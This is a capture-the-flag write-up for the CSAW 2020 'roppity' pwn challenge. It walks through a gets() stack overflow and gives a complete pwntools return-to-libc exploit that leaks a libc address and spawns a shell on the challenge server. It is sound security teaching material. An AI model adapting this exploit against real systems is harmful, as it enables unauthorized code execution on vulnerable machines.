# roppity

*pwn, 50*

`Welcome to pwn! nc pwn.chal.csaw.io 5016`

## initial review

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char local_28 [32];
  
  init(param_1);
  puts("Hello");
                    /* Smashes stack using local_28@0x004005dc (+0,1,40) */
  gets(local_28);
  return 0;
}
```

```text
❯ checksec rop
[*] '/home/sky/csaw-2020/roppity/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```text
❯ r2 rop
 -- The door is everything ...
[0x004004d0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x004004d0]> afl
0x004004d0    1 42           entry0
0x00400510    4 42   -> 37   sym.deregister_tm_clones
0x00400540    4 58   -> 55   sym.register_tm_clones
0x00400580    3 34   -> 29   sym.__do_global_dtors_aux
0x004005b0    1 7            entry.init0
0x00400690    1 2            sym.__libc_csu_fini
0x00400694    1 9            sym._fini
0x004005b7    1 37           sym.init
0x004004c0    1 6            sym.imp.setvbuf
0x00400620    4 101          sym.__libc_csu_init
0x00400500    1 2            sym._dl_relocate_static_pie
0x004005dc    1 54           main
0x004004a0    1 6            sym.imp.puts
0x004004b0    1 6            sym.imp.gets
0x00400478    3 23           sym._init
```

To sum it up -- the binary has an unbounded buffer overflow courtesy of `gets` and we don't have any convenient functions to print out the flag.  We're provided a libc binary (2.27) so high probability that'll be relevant.  

## how do we exploit this?

Given the situation (can overwrite saved return pointer, no provided function to print flag, known libc) we will probably be doing a [return-to-libc](https://en.wikipedia.org/wiki/Return-to-libc_attack) attack.  The plan then is:

1. figure out libc location in memory
2. use that address to determine the address of `"/bin/sh"` and `system` in memory
3. use ROP to call system("/bin/sh")
4. get the flag!  

How can we leak the libc address?  Well, if we know a location in the binary that points to a fixed point in libc we can leak that address and calculate the libc base off of that.  Coincidentally, we do known a location in the binary that points to a fixed location in libc -- the GOT!  By leaking the address of `__libc_start_main` in the program memory, calculating the distance of `__libc_start_main` from the base of libc 2.27, and then subtracting the latter from the former we can determine the location of libc in memory.  After this we just return back into the main function and use our new knowledge of the libc address to ROP system("/bin/sh")

## solution

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./rop")
ld = ELF("./ld-2.27.so")
rop = ROP(elf)

context.binary = elf


def conn():
    if args.LOCAL_32:
        libc = ELF("/usr/lib/libc.so.6")
        return (libc, elf.process())
    elif args.LOCAL:
        libc = ELF("./libc-2.27.so")
        return (libc, process([ld.path, elf.path], env={"LD_PRELOAD": libc.path}))
    else:
        libc = ELF("./libc-2.27.so")
        return (libc, remote("pwn.chal.csaw.io",5016))


def main():
    (libc, p) = conn()
    offset = 40


    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

    payload = offset * b"A" + p64(pop_rdi) + p64(elf.symbols['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

    p.recv(6) # read hello\n

    p.sendline(payload)

    libc_start_address = int.from_bytes(p.recv(7).rstrip(), byteorder="little")

    libc.address = libc_start_address - libc.sym["__libc_start_main"]
    print("Address of libc %s " % hex(libc.address))

    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]
    print("/bin/sh = ",hex(binsh))
    print("system = ", hex(system))

    payload = offset * b"A" + p64(pop_rdi) + p64(binsh) + p64(system) + p64(pop_rdi) + p64(binsh) + p64(system) # i uh need to do this twice idk why pls dont ask me
    open("payload.txt","wb").write(payload)
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
```

flag: `flag{r0p_4ft3r_r0p_4ft3R_r0p}`